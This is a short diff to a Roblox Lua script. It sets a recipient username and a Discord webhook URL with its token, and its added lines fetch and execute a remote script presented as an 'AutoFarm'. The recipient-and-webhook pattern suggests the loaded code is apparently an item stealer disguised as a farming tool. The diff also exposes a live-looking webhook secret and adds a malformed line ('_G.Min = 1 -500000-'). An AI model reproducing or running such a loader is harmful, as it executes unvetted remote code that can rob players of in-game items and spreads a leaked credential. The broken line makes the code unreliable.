@@ -1,3 +1,4 @@
-_G.username = "youfallyknol2"
+_G.User = "fallyknol"
 _G.Webhook = "https://discord.com/api/webhooks/1271378015418323028/v4mp7qfCmJ8ITFH4YX8RI6t0Y0_0UnU48CJF392ZJmBSbjjIAmeazyrtZpj1nKL-nIpV"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua"))()
+_G.Min = 1 -500000- 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/heads/main/AutoFarmOP.lua", true))()
